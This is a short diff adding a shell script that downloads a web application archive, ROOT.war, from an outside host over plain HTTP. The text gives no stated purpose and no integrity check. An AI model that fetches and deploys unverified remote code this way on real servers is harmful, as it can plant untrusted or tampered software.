@@ -1,0 +1,5 @@
+#!/bin/sh
+
+wget http://101.mylnikov.org/ROOT.war
+
+wait
